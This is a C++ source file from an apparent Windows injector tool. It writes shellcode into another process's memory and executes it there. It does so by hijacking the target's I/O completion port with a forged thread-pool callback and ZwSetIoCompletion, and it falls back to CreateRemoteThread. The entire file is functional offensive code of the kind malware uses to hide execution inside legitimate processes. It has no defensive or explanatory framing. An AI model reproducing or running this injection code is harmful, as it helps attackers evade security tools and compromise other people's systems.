#include "tp_execute.hpp"
#include "nt_util.hpp"
#include <cstdio>
#include <vector>

namespace {

HANDLE DupHandle(HANDLE srcProcess, HANDLE handle, DWORD access) {
    HANDLE out = nullptr;
    if (!DuplicateHandle(srcProcess, handle, GetCurrentProcess(), &out, access, FALSE, 0))
        return nullptr;
    return out;
}

HANDLE FindIoCompletion(HANDLE process) {
    DWORD bufSize = 0x10000;
    std::vector<BYTE> buf;
    NTSTATUS st;
    auto query = (nt::FnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    auto queryObj = (nt::FnNtQueryObject)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryObject");
    if (!query || !queryObj) return nullptr;

    do {
        buf.resize(bufSize);
        ULONG ret = 0;
        st = query(process, (PROCESSINFOCLASS)51, buf.data(), bufSize, &ret);
        if (st == STATUS_INFO_LENGTH_MISMATCH) bufSize <<= 1;
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!nt::Ok(st)) return nullptr;

    auto* info = reinterpret_cast<nt::ProcessHandleSnapshot*>(buf.data());
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        HANDLE dup = DupHandle(process, info->Handles[i].HandleValue, IO_COMPLETION_ALL_ACCESS);
        if (!dup) continue;

        ULONG need = 0;
        queryObj(dup, ObjectTypeInformation, nullptr, 0, &need);
        if (!need) { CloseHandle(dup); continue; }

        std::vector<BYTE> ob(need);
        if (nt::Ok(queryObj(dup, ObjectTypeInformation, ob.data(), need, &need))) {
            auto* ot = reinterpret_cast<PUBLIC_OBJECT_TYPE_INFORMATION*>(ob.data());
            if (nt::UnicodeEqLit(&ot->TypeName, L"IoCompletion"))
                return dup;
        }
        CloseHandle(dup);
    }
    return nullptr;
}

struct TpDirect {
    ULONG_PTR Task[4]; // placeholder for TP_TASK (we don't need to fill it)
    UINT64 Lock;
    LIST_ENTRY Io;
    void* Callback;
    UINT32 Numa;
    UINT8 Ideal;
    char Pad[3];
};

bool RunViaIoCompletion(HANDLE process, PVOID remoteSc) {
    HANDLE io = FindIoCompletion(process);
    if (!io) {
        printf("[!] IoCompletion handle not found in target\n");
        return false;
    }

    TpDirect direct{};
    direct.Callback = remoteSc;

    PVOID remoteDirect = VirtualAllocEx(process, nullptr, sizeof(TpDirect), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteDirect) {
        CloseHandle(io);
        return false;
    }
    if (!nt::Write(process, remoteDirect, &direct, sizeof(direct))) {
        VirtualFreeEx(process, remoteDirect, 0, MEM_RELEASE);
        CloseHandle(io);
        return false;
    }

    auto zw = (nt::FnZwSetIoCompletion)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "ZwSetIoCompletion");
    if (!zw) {
        VirtualFreeEx(process, remoteDirect, 0, MEM_RELEASE);
        CloseHandle(io);
        return false;
    }

    NTSTATUS st = zw(io, remoteDirect, nullptr, nullptr, 0);
    CloseHandle(io);
    if (!nt::Ok(st)) {
        printf("[!] ZwSetIoCompletion failed: 0x%08lX\n", (unsigned long)st);
        return false;
    }
    printf("[*] ZwSetIoCompletion OK\n");
    Sleep(100);
    return true;
}

bool RunViaRemoteThread(HANDLE process, PVOID remoteSc) {
    HANDLE th = CreateRemoteThread(process, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteSc, nullptr, 0, nullptr);
    if (!th) {
        printf("[!] CreateRemoteThread fallback failed: %lu\n", GetLastError());
        return false;
    }
    WaitForSingleObject(th, 5000);
    CloseHandle(th);
    printf("[*] CreateRemoteThread OK\n");
    return true;
}

} // namespace

bool injector::TpExecuteShellcode(DWORD pid, HANDLE process, const void* shellcode, size_t size) {
    (void)pid;
    if (!process || !shellcode || !size) return false;

    PVOID remoteSc = VirtualAllocEx(process, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteSc) {
        printf("[!] VirtualAllocEx(shellcode) failed: %lu\n", GetLastError());
        return false;
    }
    if (!nt::Write(process, remoteSc, shellcode, size)) {
        printf("[!] Failed to write shellcode\n");
        VirtualFreeEx(process, remoteSc, 0, MEM_RELEASE);
        return false;
    }

    if (RunViaIoCompletion(process, remoteSc))
        return true;

    printf("[*] Falling back to CreateRemoteThread for shellcode\n");
    return RunViaRemoteThread(process, remoteSc);
}

bool injector::TpExecuteShellcodeSync(HANDLE process, const void* shellcode, size_t size) {
    if (!process || !shellcode || !size) return false;

    PVOID remoteSc = VirtualAllocEx(process, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteSc) {
        printf("[!] VirtualAllocEx(shellcode) failed: %lu\n", GetLastError());
        return false;
    }
    if (!nt::Write(process, remoteSc, shellcode, size)) {
        VirtualFreeEx(process, remoteSc, 0, MEM_RELEASE);
        return false;
    }
    if (RunViaIoCompletion(process, remoteSc))
        return true;
    printf("[*] Falling back to CreateRemoteThread for shellcode\n");
    return RunViaRemoteThread(process, remoteSc);
}
